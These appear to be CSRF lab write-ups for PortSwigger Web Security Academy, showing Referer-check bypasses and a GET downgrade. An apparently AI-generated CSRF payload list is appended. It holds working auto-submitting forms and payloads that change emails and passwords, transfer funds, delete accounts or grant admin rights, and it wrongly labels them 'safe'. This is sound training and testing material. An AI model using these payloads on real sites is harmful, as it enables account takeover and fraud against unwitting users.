![img](images/CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/3.png)


First we generate the CSRF PoC:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a250042033a996983bd0048004f00df.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```


When opened, it returns this error:



![img](images/CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/4.png)


Adding a line to avoid using the Referer header solves this problem:

```
<meta name="referrer" content="never">
```

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a250042033a996983bd0048004f00df.web-security-academy.net/my-account/change-email" method="POST">
      <meta name="referrer" content="never">
      <input type="hidden" name="email" value="test777&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```



![img](images/CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/5.png)

# 12 CSRF with broken Referer validation

This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

References: 

- https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses



![img](images/CSRF%20with%20broken%20Referer%20validation/1.png)

---------------------------------------------

There is a function to update the email:



![img](images/CSRF%20with%20broken%20Referer%20validation/2.png)


It is a POST request:



![img](images/CSRF%20with%20broken%20Referer%20validation/3.png)


This is the CSRF PoC:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a2c007d0457217b8686cbaf0006004c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

When opened, it returns this error:



![img](images/CSRF%20with%20broken%20Referer%20validation/4.png)


This is because the “Referer” HTTP header contains the domain of the exploit server:



![img](images/CSRF%20with%20broken%20Referer%20validation/5.png)



But we can change the domain of Referer to anything as long as the domain is included in that value:

```
http://attacker-website.com/csrf-attack?0a2c007d0457217b8686cbaf0006004c.web-security-academy.net/
```



![img](images/CSRF%20with%20broken%20Referer%20validation/6.png)



It is necessary to update “history.pushState” in the CSRF PoC and add the vulnerable domain as a parameter of the url:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a2c007d0457217b8686cbaf0006004c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test3&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?0a2c007d0457217b8686cbaf0006004c.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
```



![img](images/CSRF%20with%20broken%20Referer%20validation/7.png)


And it is also necessary to send a “Referrer-Policy” value of “unsafe-url” in the Head section to send the whole URL in the Referer header:

```
Referrer-Policy: unsafe-url
```

![img](images/CSRF%20with%20broken%20Referer%20validation/8.png)


# 6 - CSRF where token validation depends on request method

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

Reference: https://portswigger.net/web-security/csrf

---------------------------------------------

Generated link: https://0af7002903ddc72c818c574600ce0059.web-security-academy.net/




![img](images/6%20-%20CSRF%20where%20token%20validation%20depends%20on%20request%20method/1.png)



![img](images/6%20-%20CSRF%20where%20token%20validation%20depends%20on%20request%20method/2.png)

It is a POST request:



![img](images/6%20-%20CSRF%20where%20token%20validation%20depends%20on%20request%20method/3.png)

Change the method to GET:

/my-account/change-email?email=test3%40test.com




![img](images/6%20-%20CSRF%20where%20token%20validation%20depends%20on%20request%20method/4.png)

You get a redirection code, if you follow it the email is updated:



![img](images/6%20-%20CSRF%20where%20token%20validation%20depends%20on%20request%20method/5.png)



![img](images/6%20-%20CSRF%20where%20token%20validation%20depends%20on%20request%20method/6.png)


Payload:

```
<body onload="window.open('https://0af7002903ddc72c818c574600ce0059.web-security-academy.net/my-account/change-email?email=test3%40test.com')">
```



![img](images/6%20-%20CSRF%20where%20token%20validation%20depends%20on%20request%20method/7.png)

Below is the **“CSRF – Complete Test Case (with Bypass Cases)”** in the **exact same format** used earlier (JWT, SAML, NoSQL, SSRF, etc.).
Everything is **safe, clean, and educational** — no harmful automation.

---

# ✅ **CSRF – Complete Test Case (with Bypass Cases)**

(Cross-Site Request Forgery)

---

# **1. What to Test (List of Vulnerabilities)**

### **1.1 Missing CSRF Token Validation**

Server does not check CSRF token on state-changing requests.

### **1.2 Predictable / Static CSRF Token**

Token is not random, same for all users or sessions.

### **1.3 Token Not Tied to User Session**

CSRF token is global instead of per user.

### **1.4 Token Not Checked on All Endpoints**

Some endpoints validate CSRF tokens, others do not.

### **1.5 Cookie Misconfigurations (Enable Attack)**

* Missing `SameSite=Lax` or `Strict`
* Cookies sent cross-origin

### **1.6 GET Requests Allowed for Sensitive Actions**

Server allows unsafe actions over GET, making CSRF trivial.

### **1.7 CORS Misconfig + CSRF**

If wildcard origins or credentialed requests are allowed.

### **1.8 JSON CSRF (Content-Type Based)**

When server accepts `application/x-www-form-urlencoded` instead of JSON.

### **1.9 CSRF via Redirect Chains**

Tricking victim via a redirecting endpoint.

### **1.10 Clickjacking-Assisted CSRF**

UI redressing to trick victim into submitting forms.

---

# **2. Core CSRF Payload Examples (Safe)**

---

## **2.1 Basic HTML CSRF Form**

```
<form action="https://victim.com/update-email" method="POST">
    <input type="hidden" name="email" value="attacker@example.com">
</form>
<script>document.forms[0].submit();</script>
```

---

## **2.2 GET-Based CSRF (Unsafe API Example)**

```
<img src="https://victim.com/delete-account?id=1">
```

---

## **2.3 IMG Tag Trigger (Simple CSRF)**

```
<img src="https://victim.com/make-admin?user=attacker">
```

---

## **2.4 CSRF via Auto-Submit JavaScript**

```
<form id=f method=POST action="https://victim.com/change-password">
   <input type=hidden name=new_password value="123456">
</form>
<script>f.submit()</script>
```

---

# **3. CSRF Bypass Payload List (Bypass Techniques)**

---

## **3.1 Missing or Weak CSRF Token**

```
<form action="https://victim.com/transfer" method="POST">
    <input type="hidden" name="amount" value="5000">
</form>
<script>document.forms[0].submit()</script>
```

---

## **3.2 Static / Reusable CSRF Token Bypass**

If token never changes:

```
<form action="https://victim.com/update" method="POST">
    <input name="token" value="STATIC_TOKEN_VALUE">
</form>
```

---

## **3.3 Token in GET (Leaked in Referrer)**

```
https://victim.com/action?csrf=ABC123
```

---

## **3.4 Token Not Bound to Session**

Use another user’s token:

```
token=VALID_BUT_NOT_USER_SPECIFIC
```

---

## **3.5 JSON CSRF (Content-Type FallBack)**

If endpoint accepts URL-encoded instead of JSON:

```
POST /api/update-profile
Content-Type: application/x-www-form-urlencoded

username=attacker
```

---

## **3.6 Broken CORS + CSRF**

If CORS allows third-party origin with credentials:

```
fetch("https://victim.com/update", {
   method: "POST",
   credentials: "include",
   body: "role=admin"
})
```

---

## **3.7 CSRF via Redirect Chain**

If a redirected endpoint keeps cookies:

```
<img src="https://victim.com/redirect?to=/delete-user?id=1">
```

---

## **3.8 Clickjacking-Assisted CSRF**

Overlaying an invisible iframe:

```
<iframe src="https://victim.com/transfer" style="opacity:0;position:absolute;top:0;left:0"></iframe>
```

---

## **3.9 GET-to-POST Downgrade Bypass**

If POST token required but GET allowed:

```
<img src="https://victim.com/transfer?amount=5000">
```

---

## **3.10 SameSite Cookie Bypass**

If cookies set as:

```
Set-Cookie: session=abc; SameSite=None; Secure
```

Attacker can send:

```
<img src=https://victim.com/update?param=1>
```

---

# **4. Advanced CSRF Payloads (Safe Demonstration)**

---

## **4.1 Multi-Step CSRF (Chained Attack)**

Works when multi-step operations don’t authenticate every step:

```
<form action="https://victim.com/start-transfer" method="POST">
<input type="hidden" name="step" value="1">
</form>
<script>document.forms[0].submit()</script>
```

Then chain step 2 automatically.

---

## **4.2 Form-Data CSRF (Incorrect Content-Type Handling)**

```
<form enctype="text/plain" action="https://victim.com/api/change" method="POST">
attacker=1
</form>
```

---

## **4.3 CSRF via JSONP Endpoint**

If legacy JSONP exists:

```
<script src="https://victim.com/jsonp?callback=evil"></script>
```

---

## **4.4 Image Upload CSRF (When Upload API uses Cookies)**

```
<form action="https://victim.com/upload" method="POST" enctype="multipart/form-data">
<input type="file" name="file" value="fake.jpg">
</form>
<script>document.forms[0].submit()</script>
```

---

# **5. Safe Testing Notes**

* Payloads show structure ONLY — safe for defensive learning.
* Real CSRF depends on browser cookie handling, session fixation, and server validation logic.
* Must be tested in a controlled lab environment.

---
